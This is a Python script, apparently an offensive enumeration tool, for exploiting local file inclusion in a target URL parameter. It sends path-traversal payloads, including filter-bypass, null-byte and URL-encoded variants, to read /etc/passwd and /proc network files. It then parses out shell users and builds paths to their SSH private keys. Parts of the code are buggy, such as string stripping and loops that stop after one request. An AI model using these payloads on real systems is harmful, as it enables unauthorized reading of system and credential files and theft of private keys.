#!/usr/bin/python3

# Arturo Negreiros Samanez => HoneyLoad
# this script will be used to
# get the more specific information
# trying to exploit a LFI

import time
import re
import sys
import requests
import os
from pprint import pprint
from typing import *


def find_ssh_key(users: List[str]) -> List[str]:
    """only return the paylods"""
    return [f"/home/{user}/.ssh/id_rsa" for user in users]


def report_found_proces():
    """
    The main goal for a local file inclusion, always will be even if you're not
    able to see the default credentials
    """
    pass



def usage():
    print("""\t\t \n\n[*] python3 LFI-enumeration.py http://target.com?page=LFI\n\n""")
    sys.exit(0)



def lfi_brute_enumeration(url: str) -> None:

    """
    There are several levesl to implement a LOCAL FILE INCLUSION
    but, we need to keep in mind, that some pages implement sanitizers
    in that case, we need to make another methods of enumeration :)
    """
    lfi_levels = {
        "1": "../../../../../../../../../etc/passwd",
        "2": "....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd",
        "3": "....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd%00",
        "4":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
        "5": "%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64"
    }
    
    if "LFI" not in url:
        raise ValueError("The url target must contain the value of the keyword LFI :)")
        sys.exit(1)
    page_to_enumerate = url.strip("LFI")

    sess = requests.Session()

    for x in lfi_levels.keys():
        ress = sess.get(url=page_to_enumerate+lfi_levels[x], allow_redirects=False)
        
        if x == "passwd":
            users = re.findall(r".*\/bin\/bash", ress.text)
            potentials_users = [re.findall(r"(.*?)\:x", user)[0] for user in users]
            print(potentials_users)
            
        else:
            print(ress.text)
        # time.sleep(2)
        break


def lfi_wrappers_implementation(url: str) -> None:
    pass


def lfi_simple_enumeration(url: str) -> None:
    """
    To see the most common intrussion, in this case
    this script only use the common enumeration process
    but in other cases, there are sanitizers in the request
    process to disallow use the common enumeration, in that 
    case we use another ways to get access to the files
    """

    potentials_users = []
    dict_list = {
        "passwd": "/etc/passwd",
        "local_address":"/proc/net/tcp",
        "see_contatiners": "/proc/net/fib_trie"
    }
    
    if "LFI" not in url:
        raise ValueError("The url target must contain the value of the keyword LFI :)")
        sys.exit(1)
    page_to_enumerate = url.strip("LFI")

    sess = requests.Session()

    for x in dict_list.keys():
        ress = sess.get(url=page_to_enumerate+dict_list[x], allow_redirects=False)
        
        if x == "passwd":
            users = re.findall(r".*\/bin\/bash", ress.text)
            potentials_users = [re.findall(r"(.*?)\:x", user)[0] for user in users]
            print(potentials_users)
            print(find_ssh_key(potentials_users))
        else:
            print(ress.text)
        # time.sleep(2)
        break
        


def main():
    try:
        if len(sys.argv) < 2:
            usage()
        url = sys.argv[1]
        lfi_simple_enumeration(url)
    except Exception as e:
        print(str(e))
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\t\t[*] Exiting...\n")


if __name__ == "__main__":
    main()
